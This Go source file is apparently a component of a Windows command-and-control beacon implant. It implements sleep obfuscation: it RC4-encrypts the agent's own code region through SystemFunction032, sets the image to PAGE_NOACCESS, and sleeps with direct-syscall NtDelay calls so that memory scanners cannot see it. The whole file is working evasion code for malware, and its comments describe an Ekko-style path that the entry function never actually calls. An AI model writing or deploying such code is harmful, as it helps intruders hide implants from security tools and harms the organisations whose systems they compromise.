//go:build windows

package winsyscall

import (
	"time"
	"unsafe"
)

// UString is the UNICODE_STRING layout expected by SystemFunction032.
type UString struct {
	Length        uint16
	MaximumLength uint16
	_             uint32 // padding to 8-byte align Buffer on x64
	Buffer        uintptr
}

// SleepObf is the primary sleep obfuscation entry point for the beacon loop.
//
// Priority order:
//  1. SpoofedSleep — full stack spoofing + RC4 + NOACCESS (amd64 only).
//  2. sleepEkkoLite — RC4 via SystemFunction032 + NtDelayExecution.
//  3. sleepPeFluctuation — PAGE_NOACCESS only, no encryption.
//  4. NtDelay — bare direct syscall sleep, no memory protection change.
func SleepObf(d time.Duration) {
	base, size := selfTextRegion()
	if base == 0 || size == 0 {
		NtDelay(d)
		return
	}

	// Prefer the full stack-spoofed path (amd64 Windows only).
	if ProcSystemFunction032.Find() == nil {
		SpoofedSleep(d)
		return
	}

	sleepPeFluctuation(base, size, d)
}

// sleepEkkoLite RC4-encrypts the agent's .text region, sleeps, then decrypts.
func sleepEkkoLite(base, size uintptr, d time.Duration) {
	key := makeRC4Key(base, d)
	keySlice := key[:]

	regionKey := UString{
		Length:        uint16(len(keySlice)),
		MaximumLength: uint16(len(keySlice)),
		Buffer:        uintptr(unsafe.Pointer(&keySlice[0])),
	}
	regionData := UString{
		Length:        uint16(size),
		MaximumLength: uint16(size),
		Buffer:        base,
	}

	oldProtect, err := NtProtectSelf(base, size, PageReadWrite)
	if err != nil {
		time.Sleep(d)
		return
	}

	ProcSystemFunction032.Call(
		uintptr(unsafe.Pointer(&regionData)),
		uintptr(unsafe.Pointer(&regionKey)),
	)

	NtProtectSelf(base, size, PageExecRead) //nolint:errcheck

	NtDelay(d)

	NtProtectSelf(base, size, PageReadWrite) //nolint:errcheck
	ProcSystemFunction032.Call(
		uintptr(unsafe.Pointer(&regionData)),
		uintptr(unsafe.Pointer(&regionKey)),
	)

	NtProtectSelf(base, size, oldProtect) //nolint:errcheck
}

// sleepPeFluctuation changes the agent image region to PAGE_NOACCESS for the
// duration of the sleep via NtProtectVirtualMemory direct syscall.
func sleepPeFluctuation(base, size uintptr, d time.Duration) {
	oldProtect, err := NtProtectSelf(base, size, PageNoAccess)
	if err != nil {
		time.Sleep(d)
		return
	}

	NtDelay(d)

	NtProtectSelf(base, size, oldProtect) //nolint:errcheck
}

// makeRC4Key builds a 16-byte key from current base address + sleep duration.
func makeRC4Key(base uintptr, d time.Duration) [16]byte {
	ns := uint64(d.Nanoseconds())
	b := uint64(base)
	var k [16]byte
	for i := range k {
		k[i] = byte((b >> (uint(i%8) * 8)) ^ (ns >> (uint(i%8) * 8)))
	}
	return k
}

// MEMORY_BASIC_INFORMATION for VirtualQuery
type memBasicInfo struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
}

var procVirtualQuery = ModKernel32.NewProc("VirtualQuery")

// selfTextRegion returns base + size of the current module's first RX MEM_IMAGE region.
func selfTextRegion() (uintptr, uintptr) {
	hMod, _, _ := ProcGetModuleHandleW.Call(0) // NULL = current module
	if hMod == 0 {
		return 0, 0
	}
	base := hMod
	var mbi memBasicInfo
	sz := unsafe.Sizeof(mbi)

	for addr := base; ; addr += mbi.RegionSize {
		r, _, _ := procVirtualQuery.Call(addr, uintptr(unsafe.Pointer(&mbi)), sz)
		if r == 0 {
			break
		}
		// MEM_IMAGE=0x1000000, PAGE_EXECUTE_READ=0x20, MEM_COMMIT=0x1000
		if mbi.Type == 0x1000000 && mbi.State == 0x1000 &&
			(mbi.Protect == 0x20 || mbi.Protect == 0x40) {
			return mbi.BaseAddress, mbi.RegionSize
		}
		if mbi.RegionSize == 0 {
			break
		}
	}
	return 0, 0
}
